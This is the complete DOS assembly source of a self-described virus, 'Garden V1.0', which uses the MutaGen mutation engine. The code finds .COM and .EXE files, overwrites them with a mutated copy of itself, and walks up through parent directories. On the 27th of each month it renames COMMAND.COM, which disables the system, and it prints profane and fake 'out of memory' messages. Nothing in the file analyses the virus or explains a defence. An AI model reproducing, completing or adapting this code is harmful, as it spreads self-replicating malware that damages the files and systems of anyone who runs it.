

;
;
;           ÛÛÛÛÛÛÛÛ  ÛÛÛÛÛÛÛ  ÛÛÛÛÛ    ÛÛÛÛ     ÛÛÛÛÛ  ÛÛ     ÛÛ
;           ÛÛ        ÛÛ   ÛÛ  ÛÛ  ÛÛ   ÛÛ  ÛÛ   ÛÛ     ÛÛÛÛ   ÛÛ
;           ÛÛ   ÛÛÛ  ÛÛÛÛÛÛÛ  ÛÛÛÛÛ    ÛÛ   ÛÛ  ÛÛÛÛÛ  ÛÛ ÛÛ  ÛÛ
;           ÛÛ    ÛÛ  ÛÛ   ÛÛ  ÛÛ  ÛÛ   ÛÛ  ÛÛ   ÛÛ     ÛÛ  ÛÛ ÛÛ
;           ÛÛÛÛÛÛÛÛ  ÛÛ   ÛÛ  ÛÛ   ÛÛ  ÛÛÛÛ     ÛÛÛÛÛ  ÛÛ    ÛÛÛ
;
;
;                                   BY
;
;                               N I P P L E
;
;
;  P.S. It's not that i don't like Pearl Jam..I just don't like girl who
;       loves them :-)


;                    OH...GOD I SURE LIKE JMP COMMAND :-)

extrn   _mutagen:near

MGEN_SIZE        equ     1196           ; Size of MutaGen v1.00

code    segment byte    public  'code'
        org     100h
        assume  cs:code

start:                                  
         call    $+3
         pop     bp
         sub     bp,(offset $-1)
         jmp     Begin

KogaCOM  db  '*.com',0
KogaEXE  db  '*.exe',0
Go_Down  db  '..',0
old_name db  'c:\command.com',0
new_name db  'c:\garden.com',0
Broj     db  0
jeli     db  0
Logo     db  '[Garden]'
Text1    db  'This is Garden V1.0.Very simple virus.New version will be better!!!'
Msg      db  'Not enough memory.$'
Msg1     db  'I need 4K more to start myself!$'
Msg2     db  'FUCK PEARL JAM!!!!LONG LIVE TECHNO!!!!$'

Begin:
; Ovdje se zapamti trenutni directorij
         mov     ah,47h
         mov     dl,0
         lea     si,[bp+offset Old_Dir]
         int     21h

         mov     byte ptr [bp+offset Broj],0 ; Conuter of infections
         mov     byte ptr [bp+offset jeli],0 ; Infecting .COM or .EXE

Repeat_Dir:
         lea     dx,[bp+offset KogaCOM]      ; Offset of KogaCOM

toto:
         mov     ah,4eh          ; FINDFIRST
         mov     cx,20h
         int     21h
         jnb     dalje           ; If exist jump to Dalje
         jmp     onako
dalje:
         cmp     word ptr [bp+80h+33], 'AM' ; Is it COMMAND.COM ?
         je      Find_Next
         cmp     word ptr [bp+80h+31], 'OD' ; IS it 4DOS.COM ?
         je      Find_Next

         mov     ax,3d01h        ; Open file
         mov     dx,9eh
         int     21h
         mov     bx,ax

; Set attributs to ARCHIVE
         mov     ax,4301h
         mov     cx,20h
         int     21h

         Jmp     Infect
CloseIt:
         mov     ah,3eh          ; Close File
         int     21h

         add     byte ptr [bp+offset Broj],1    ; Add 1 to counter of infections
         cmp     byte ptr [bp+offset Broj],Max  ; Enough of infections?
         je      kraj

Find_next:
         mov     ah,4fh             ; FINDNEXT
         int     21h
         jnb     dalje              ; There is new file?
Onako:
         cmp     byte ptr [bp+offset jeli],1    ; Infecting COM or EXE
         je      kraj
         lea     dx,[bp+offset KogaEXE]         ; Set to EXE
         mov     byte ptr [bp+offset jeli],1
         jmp     toto

kraj:

; This is normal DOS command CD .. :-)
         mov     ah,3bh
         lea     dx,[bp+offset Go_Down]
         int     21h
         jnc     Repeat_Dir

; What's the time?

         mov     ah,2ch
         int     21h
         mov     ah,9h

         cmp     dl,50
         jbe     Poruka2
         lea     dx,[bp+offset Msg1]

         jmp     Finish
Poruka2:
         lea     dx,[bp+offset Msg]
Finish:
         int     21h

; Return to old directory

         mov     ah,3bh
         lea     dx,[bp+offset Old_Dir]
         int     21h

; Rename files if it is 27 in month
         mov     ah,2ah
         int     21h
         cmp     dl,1bh
         jnz     The_End

         mov     ah,56h
         lea     dx,[bp+offset old_name]
         lea     di,[bp+offset new_name]
         int     21h

         mov     ah,9h
         lea     dx,[bp+offset Msg2]
         int     21h

; The End
The_End:
         int     20h

Infect:
; Calling MutaGen-a
         mov     dx,100h
         mov     cx,VIRUS_SIZE           ; Virus size
         lea     si,[bp+offset start]
         lea     di,[bp+virus_end+80h]   ; Where to put it?
         call    _MUTAGEN

         lea     dx,[bp+offset virus_end+80h] ; Write virus to file
         mov     ah,40h
         int     21h
         jmp    CloseIt


Old_Dir db 64 dup (0)

Max             equ     3
virus_end       equ     $ + MGEN_SIZE

VIRUS_SIZE      equ     virus_end - offset start

code    ends               
        end start

